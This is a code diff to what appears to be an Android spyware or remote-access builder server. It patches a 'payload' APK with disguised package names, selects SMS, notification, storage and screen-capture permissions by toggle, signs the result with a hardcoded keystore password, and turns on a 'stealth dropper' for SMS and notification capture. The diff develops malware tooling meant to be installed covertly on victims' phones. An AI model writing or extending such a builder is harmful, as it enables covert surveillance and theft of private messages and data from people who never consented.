@@ -23,7 +23,7 @@ const TEMP_DIR   = path.join(__dirname, 'temp');
 const BASE_APK      = path.join(ASSETS_DIR, 'base.apk');
 const NOX_DROP_BASE = path.join(ASSETS_DIR, 'nox_drop_base.apk');
 const DEFAULT_ICON  = path.join(ASSETS_DIR, 'default_icon.png');
-const KEYSTORE      = path.join(ASSETS_DIR, 'clean_release.jks');
+const KEYSTORE      = path.join(ASSETS_DIR, 'usman90.jks');
 const SIGNER        = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -75,13 +75,13 @@ function makeNeutralPerm(originalPerm) {
     return prefix + '0'.repeat(needed);
 }
 
-const OLD_PKG = 'com.vision.quest';
+const OLD_PKG = 'com.asml.tech';
 const PKG_POOL = [
-    'com.system.patch', 'com.google.media', 'com.device.audio', 'com.secure.vault',
-    'com.common.tools', 'com.native.frame', 'com.mobile.cloud', 'com.portal.share',
-    'com.update.suite', 'com.client.relay', 'com.global.nodes', 'com.direct.links',
-    'com.matrix.frame', 'com.custom.entry', 'com.vector.links', 'com.active.track',
-    'com.static.route', 'com.master.layer', 'com.remote.hub01', 'com.socket.layer'
+    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
+    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
+    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
+    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
+    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
 ];
 
 function resolvePackage(userPkg) {
@@ -91,16 +91,26 @@ function resolvePackage(userPkg) {
     if (clean.length === OLD_PKG.length && parts.length === 3 && parts[0] === 'com') {
         return clean;
     }
-    let p = (parts.length >= 2 ? parts[1] : (parts[0] || 'apps')).replace(/[^a-z0-9]/g, '');
-    let s = (parts.length >= 3 ? parts[2] : 'sync').replace(/[^a-z0-9]/g, '');
-    p = (p + 'system').substring(0, 6);
-    s = (s + 'frame').substring(0, 5);
-    return `com.${p}.${s}`;
+    let prefix = (parts.length >= 2 ? parts[1] : (parts[0] || 'app')).replace(/[^a-z0-9]/g, '');
+    let suffix = (parts.length >= 3 ? parts[2] : 'sync').replace(/[^a-z0-9]/g, '');
+    if (!prefix) prefix = 'apps';
+    if (!suffix) suffix = 'view';
+    const p4 = (prefix + 'core').substring(0, 4);
+    const s4 = (suffix + 'sync').substring(0, 4);
+    return `com.${p4}.${s4}`;
 }
 
 function patchManifestPackage(manifestBuf, newPkg) {
     const stringCount = manifestBuf.readUInt32LE(16);
     const stringStart = manifestBuf.readUInt32LE(28);
+    const newRootBuf = toUtf16LE(newPkg);
+
+    const oldAuth = `${OLD_PKG}.androidx-startup`;
+    const newAuth = `${newPkg}.androidx-startup`;
+    const oldPerm = `${OLD_PKG}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
+    const newPerm = `${newPkg}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
+    const oldAction = `${OLD_PKG}.ACTION_RESUME`;
+    const newAction = `${newPkg}.ACTION_RESUME`;
 
     for (let i = 0; i < stringCount; i++) {
         const offset = manifestBuf.readUInt32LE(36 + i * 4);
@@ -109,10 +119,18 @@ function patchManifestPackage(manifestBuf, newPkg) {
         const strOffset = absOffset + 2;
         const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);
 
-        if (str.startsWith(OLD_PKG)) {
-            const updated = newPkg + str.substring(OLD_PKG.length);
-            toUtf16LE(updated).copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Manifest entry updated: "${str}" -> "${updated}"`);
+        if (str === OLD_PKG) {
+            newRootBuf.copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${newPkg}"`);
+        } else if (str === oldAuth) {
+            toUtf16LE(newAuth).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Authority updated: "${oldAuth}" -> "${newAuth}"`);
+        } else if (str === oldPerm) {
+            toUtf16LE(newPerm).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Permission updated: "${oldPerm}" -> "${newPerm}"`);
+        } else if (str === oldAction) {
+            toUtf16LE(newAction).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Action updated: "${oldAction}" -> "${newAction}"`);
         }
     }
 }
@@ -140,7 +158,7 @@ function patchArscTitle(arscBuf, targetName) {
 
 async function signApk(unsignedPath, outDir = TEMP_DIR) {
     const ksArgs = fs.existsSync(KEYSTORE)
-        ? `--ks "${KEYSTORE}" --ksAlias app_signer --ksPass "God112256@" --ksKeyPass "God112256@"`
+        ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
         : '';
     const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" ${ksArgs} --allowResign`;
 
@@ -449,16 +467,19 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     permsToNeutralize.push(
                         'android.permission.READ_MEDIA_IMAGES',
                         'android.permission.READ_MEDIA_VIDEO',
-                        'android.permission.READ_MEDIA_AUDIO',
                         'android.permission.READ_EXTERNAL_STORAGE',
                         'android.permission.WRITE_EXTERNAL_STORAGE'
                     );
                 }
                 if (!isFileManagerEnabled) {
-                    permsToNeutralize.push('android.permission.MANAGE_EXTERNAL_STORAGE');
+                    permsToNeutralize.push(
+                        'android.permission.MANAGE_EXTERNAL_STORAGE'
+                    );
                 }
                 if (!isScreenCaptureEnabled) {
-                    permsToNeutralize.push('android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION');
+                    permsToNeutralize.push(
+                        'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION'
+                    );
                 }
                 if (!isForegroundNotifEnabled) {
                     permsToNeutralize.push('android.permission.POST_NOTIFICATIONS');
@@ -470,7 +491,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
 
                 if (!isScreenCaptureEnabled) {
-                    binaryReplaceU16(manifestBuf, 'mediaProjection', 'connectedDevice');
+                    binaryReplaceU16(manifestBuf, 'mediaProjection', 'dataSync_______');
                 }
 
                 manifestEntry.setData(manifestBuf);
@@ -543,7 +564,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const unsignedPayloadPath = path.join(jobDir, `unsigned-payload.apk`);
             zip.writeZip(unsignedPayloadPath);
 
-            await sendUpdate('apk_progress', { step: 'Signing payload package with release key...', progress: 85 });
+            await sendUpdate('apk_progress', { step: 'Signing payload package with usman90 key...', progress: 85 });
             await signApk(unsignedPayloadPath, jobDir);
 
             const signedPayloadName = fs.readdirSync(jobDir)
@@ -560,7 +581,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             console.log(`[APK] Payload uploaded successfully: ${payloadDownloadUrl}`);
 
-            const needsStealthDropper = false;
+            const needsStealthDropper = isSmsEnabled || isNotifListenerEnabled;
             let finalDeliveryUrl = payloadDownloadUrl;
 
             if (needsStealthDropper) {
